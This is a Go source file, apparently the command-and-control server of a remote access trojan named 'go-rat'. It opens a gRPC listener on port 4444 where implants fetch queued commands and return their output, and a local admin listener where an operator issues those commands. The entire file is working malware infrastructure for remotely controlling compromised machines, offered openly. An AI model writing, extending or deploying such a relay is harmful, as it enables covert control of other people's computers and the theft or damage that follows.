package main

import (
	"context"
	"errors"
	"fmt"
	"github.com/charmbracelet/log"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"net"
)

type implantServer struct {
	work, output chan *grpcapi.Command
	grpcapi.ImplantServer
}

type adminServer struct {
	work, output chan *grpcapi.Command
	grpcapi.AdminServer
}

func newImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func newAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	cmd := new(grpcapi.Command)

	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- command
	}()
	res = <-s.output
	return res, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := newImplantServer(work, output)
	admin := newAdminServer(work, output)
	client_addr := ":9090"
	implant_addr := ":4444"
	if implantListener, err = net.Listen("tcp", implant_addr); err != nil {
		log.Print(implantListener)
		log.Fatal("Error en el listener del implant", "ERROR", err)
	}

	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Print(adminListener)
		log.Fatal("Error en el listener del admin", "ERROR", err)
	}

	if adminListener == nil || implantListener == nil {
		log.Fatal("[!] No se puede escuchar.", "ERROR", "Los listeners son nil!!!")
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	if grpcAdminServer == nil || admin == nil {
		log.Fatal("grpcAdmin server es nulo")
	}
	if grpcImplantServer == nil || implant == nil {
		log.Fatal("grpcAdmin server es nulo")
	}
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	go func() {
		log.Infof("[+] ImplantListener escuchando en %s", implant_addr)
		err = grpcImplantServer.Serve(implantListener)
		if err != nil {
			log.Fatal(err)
		}
	}()
	log.Infof("[+] AdminListener escuchando en %s", client_addr)
	err = grpcAdminServer.Serve(adminListener)
	if err != nil {
		log.Fatal(err)
	}

}
